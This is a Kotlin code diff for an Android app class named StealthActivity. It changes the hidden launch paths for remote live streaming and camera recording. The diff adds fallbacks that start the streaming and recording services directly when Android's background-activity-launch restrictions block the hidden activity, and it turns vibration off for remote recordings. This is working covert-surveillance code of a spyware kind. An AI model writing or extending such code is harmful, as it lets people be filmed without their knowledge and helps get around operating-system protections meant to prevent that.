@@ -20,21 +20,38 @@ class StealthActivity : Activity() {
         const val EXTRA_CAMERA_LENS = "extra_camera_lens"
 
         fun launchForLiveStream(context: Context, cameraLens: String = "BACK") {
-            val intent = Intent(context, StealthActivity::class.java).apply {
-                action = ACTION_START_LIVE
-                putExtra(EXTRA_CAMERA_LENS, cameraLens)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+            try {
+                val intent = Intent(context, StealthActivity::class.java).apply {
+                    action = ACTION_START_LIVE
+                    putExtra(EXTRA_CAMERA_LENS, cameraLens)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+                }
+                context.startActivity(intent)
+            } catch (e: Exception) {
+                Log.w(TAG, "StealthActivity launch for live stream: ${e.message}")
             }
-            context.startActivity(intent)
+            // Ensure LiveStreamService starts directly even if Background Activity Launch is restricted
+            LiveStreamService.startService(context, cameraLens)
         }
 
         fun launchForRemoteRecording(context: Context, cameraLens: String = "BACK") {
-            val intent = Intent(context, StealthActivity::class.java).apply {
-                action = ACTION_START_RECORD
-                putExtra(EXTRA_CAMERA_LENS, cameraLens)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+            try {
+                val intent = Intent(context, StealthActivity::class.java).apply {
+                    action = ACTION_START_RECORD
+                    putExtra(EXTRA_CAMERA_LENS, cameraLens)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+                }
+                context.startActivity(intent)
+            } catch (e: Exception) {
+                Log.w(TAG, "StealthActivity launch for recording: ${e.message}")
             }
-            context.startActivity(intent)
+            // Ensure CameraRecordingService starts directly even if Background Activity Launch is restricted
+            CameraRecordingService.startService(
+                context = context,
+                enableVibration = false,
+                cameraLens = cameraLens,
+                isRemote = true
+            )
         }
     }
 
